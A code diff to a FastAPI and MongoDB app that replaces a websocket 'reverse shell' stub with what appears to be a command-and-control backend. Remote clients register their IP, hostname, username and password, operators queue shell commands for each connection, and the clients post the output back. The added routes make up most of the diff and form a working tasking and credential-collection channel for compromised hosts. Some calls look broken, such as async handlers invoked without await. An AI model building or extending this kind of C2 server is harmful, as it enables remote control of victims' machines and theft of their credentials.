@@ -4,11 +4,6 @@ from gridfs import GridFS
 from pymongo import MongoClient
 from pydantic import BaseModel
 from fastapi.templating import Jinja2Templates
-from typing import List
-from utils.shell import start_shell
-import aiosubprocess
-import websockets
-import subprocess
 import os
 
 app = FastAPI()
@@ -23,31 +18,6 @@ fs = GridFS(db)
 
 class FileResponse(BaseModel):
     filename: str
-
-# websocket ConnectionManager class
-class ConnectionManager:
-    def __init__(self):
-        self.active_connections: List[WebSocket] = []
-
-    async def connect(self, websocket: WebSocket):
-        await websocket.accept()
-        self.active_connections.append(websocket)
-
-    async def disconnect(self, websocket: WebSocket):
-        self.active_connections.remove(websocket)
-
-    async def send_shell_output(self, websocket: WebSocket, message: str):
-        await websocket.send_text(message)
-
-    async def receive_shell_command(self, websocket: WebSocket):
-        command = await websocket.receive_text()
-        return command
-    
-    def is_connected(self, websocket: WebSocket):
-        return websocket in self.active_connections
-
-manager = ConnectionManager()
-
 
 # index route
 @app.get('/')
@@ -116,46 +86,124 @@ async def download_file(filename: str):
     # Return the file data as a response
     return StreamingResponse(grid_file, media_type='application/octet-stream')
 
-active_websockets = {}
+# render a list of all connections in an HTML template
+@app.get('/command-center')
+async def command_center(request: Request):
+    # Retrieve all connections from the database
+    connection_list = []
+    for connection in connections.find():
+        connection_list.append(connection)
 
-@app.websocket("/ws/{client_id}")
-async def websocket_endpoint(websocket: WebSocket, client_id: int):
-    await websocket.accept()
+    return templates.TemplateResponse('command_center.html', {'request': request, 'connection_list': connection_list})
 
-    # Store the WebSocket connection for future reference
-    active_websockets[client_id] = websocket
 
-    print(f"Client {client_id} connected to the WebSocket")
-    print(f"Number of active WebSocket connections: {len(active_websockets)}")
-    print(f"Active WebSocket connections: {active_websockets}")
+# "terminal" or command center route
+@app.get("/command-center/terminal/{connection_id}")
+def terminal(request: Request, connection_id: int):
+    # get all commands for the client from the database
+    commands = get_command_list(connection_id)
+    # get the output of the command from the database
+    output = get_output(connection_id)
+    # get the details of the connection from the database
+    connection = get_connection_details(connection_id)
+    return templates.TemplateResponse("terminal.html", {"request": request, "connection_id": connection_id, "commands": commands, "output": output, "connection": connection})
 
-    try:
-        while True:
-            data = await websocket.receive_text()
+# register a new connection
+@app.post('/register')
+async def register_connection(os_type: str, ip_address: str, hostname: str, username: str, password: str):
+    # set username and password to None if they are empty
+    if username == "": username = None
+    if password == "": password = None
+    # store the connection in the database
+    connection_id = connections.insert_one({"os_type": os_type, "ip_address": ip_address, "hostname": hostname, "username": username, "password": password, "commands": [], "output": ""}).inserted_id
+    return {"id": str(connection_id)}
+    
+# unregister a connection
+@app.delete('/unregister/{connection_id}')
+async def unregister_connection(connection_id: str):
+    # delete the connection from the database
+    connections.delete_one({"_id": connection_id})
+    return {"message": "Connection unregistered"}
 
-            # Process the command or data received from the web terminal here.
-            # You can execute commands, run scripts, etc., on the server.
+# get the details of a connection
+@app.get('/connection/{connection_id}/details')
+async def get_connection_details(connection_id: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
 
-            # For demonstration, let's echo the data back to the terminal.
-            print(f"Received data from client {client_id}: {data}")
-            await websocket.send_text(data)
-    except WebSocketDisconnect:
-        # WebSocket disconnected, remove it from the dictionary
-        del active_websockets[client_id]
+    return connection
 
-@app.get("/terminal/{client_id}")
-def terminal(request: Request, client_id: int):
-    # Replace `client_id` with the appropriate value
-    return templates.TemplateResponse("terminal.html", {"request": request, "client_id": client_id})
+# return the new commands for the client from the database based on the connection ID
+@app.get('/commands/{connection_id}')
+async def get_commands(connection_id: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
 
-# send the command to the reverse shell
-@app.post("/send-command")
-async def send_command(command: str):
-    return await manager.receive_shell_command(command)
+    # retrieve the commands from the database
+    commands = connection["commands"]
 
-# receive the command from the reverse shell
-@app.get("/receive-command")
-async def receive_command():
-    return await manager.send_shell_output()
+    # clear the commands from the database
+    connections.update_one({"_id": connection_id}, {"$set": {"commands": []}})
+
+    return {"commands": commands}
+
+# add the output of the command to the database
+@app.post('/output/{connection_id}')
+async def add_output(connection_id: str, output: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
+
+    # add the output to the database
+    connections.update_one({"_id": connection_id}, {"$set": {"output": output}})
+
+    return {"message": "Output added to queue"}
+
+# get the output of the command from the database
+@app.get('/output/{connection_id}')
+async def get_output(connection_id: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
+
+    # retrieve the output from the database
+    output = connection["output"]
+
+    # clear the output from the database
+    connections.update_one({"_id": connection_id}, {"$set": {"output": ""}})
+
+    return {"output": output}
+
+# add a new command to the database
+@app.post('/command/{connection_id}')
+async def add_command(connection_id: str, command: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
+
+    # add the command to the database
+    connections.update_one({"_id": connection_id}, {"$push": {"commands": command}})
+
+    return {"message": "Command added to queue"}
+
+# get a list of all commands for one connection from the database to be displayed in the web interface
+@app.get('/command-list/{connection_id}')
+async def get_command_list(connection_id: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
+
+    # retrieve the commands from the database
+    commands = connection["commands"]
+
+    return {"commands": commands}
 
 
